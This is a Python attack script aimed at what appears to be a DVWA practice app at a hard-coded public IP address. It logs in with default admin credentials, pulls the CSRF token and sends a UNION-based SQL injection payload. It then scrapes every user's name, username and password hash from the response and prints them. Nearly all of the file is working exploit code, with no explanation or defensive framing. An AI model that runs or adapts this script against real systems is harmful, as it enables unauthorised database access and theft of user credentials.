
import requests
import re
import urllib.parse

url = "http://31.97.117.123/"
session = requests.Session()

# Login first
response = session.get(f"{url}login.php")
token_match = re.search(r"user_token'\s+value='([a-f0-9]+)'", response.text)
csrf_token = token_match.group(1)

login_data = {
    "username": "admin",
    "password": "password",
    "user_token": csrf_token,
    "Login": "Login"
}

session.post(f"{url}login.php", data=login_data)

print("[*] Extracting all users with password hashes via SQL injection...")

# SQLi payload to get all users
payload = "1' UNION SELECT user_id, first_name, last_name, user, password FROM users WHERE '1'='1"
encoded_payload = urllib.parse.quote(payload)

response = session.get(f"{url}vulnerabilities/sqli/?id={encoded_payload}&Submit=Submit")

# Extract user data from response
print("\n[+] Parsing user data from response...\n")

# Look for the ID field output pattern
# The page likely displays user data in a structured format
lines = response.text.split('\n')

# Find lines that contain user information
user_pattern = re.compile(r'ID:\s*(\d+)|First name:\s*([^<]+)|Surname:\s*([^<]+)|User:\s*([^<]+)|Password:\s*([^<]+)')

users_data = []
current_user = {}

for line in lines:
    line_clean = line.strip()
    if 'ID:' in line:
        if current_user:
            users_data.append(current_user)
        current_user = {}
        match = re.search(r'ID:\s*(\d+)', line)
        if match:
            current_user['id'] = match.group(1)
    elif 'First name:' in line:
        match = re.search(r'First name:\s*([^<]+)', line)
        if match:
            current_user['first_name'] = match.group(1).strip()
    elif 'Surname:' in line:
        match = re.search(r'Surname:\s*([^<]+)', line)
        if match:
            current_user['surname'] = match.group(1).strip()
    elif 'User:' in line:
        match = re.search(r'User:\s*([^<]+)', line)
        if match:
            current_user['username'] = match.group(1).strip()
    elif 'Password:' in line:
        match = re.search(r'Password:\s*([^<]+)', line)
        if match:
            current_user['password_hash'] = match.group(1).strip()

if current_user:
    users_data.append(current_user)

# Display all users
if users_data:
    print("=" * 80)
    print("EXTRACTED USER DATA FROM DATABASE")
    print("=" * 80)
    for user in users_data:
        print(f"\nID: {user.get('id', 'N/A')}")
        print(f"First Name: {user.get('first_name', 'N/A')}")
        print(f"Surname: {user.get('surname', 'N/A')}")
        print(f"Username: {user.get('username', 'N/A')}")
        print(f"Password Hash: {user.get('password_hash', 'N/A')}")
        print("-" * 80)
else:
    print("[!] Could not parse user data. Showing raw response section...")
    # Find the content area
    content_match = re.search(r'<table[^>]*>.*?</table>', response.text, re.DOTALL)
    if content_match:
        print(content_match.group(0)[:1500])

